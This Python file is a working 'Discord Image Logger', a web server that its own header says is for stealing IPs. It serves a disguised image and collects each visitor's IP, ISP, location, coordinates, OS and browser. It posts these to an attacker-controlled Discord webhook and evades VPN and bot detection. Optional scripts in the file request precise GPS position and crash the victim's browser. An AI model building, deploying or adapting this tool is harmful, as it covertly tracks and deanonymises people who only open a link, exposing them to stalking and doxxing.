# Image Logger
# By Team C00lB0i/C00lB0i | https://github.com/OverPowerC

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "C00lB0i"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/your/webhook",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/OverPowerC/Chromebook-Crasher)
    
    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by C00lB0i's Image Logger. https://github.com/OverPowerC", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/OverPower/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
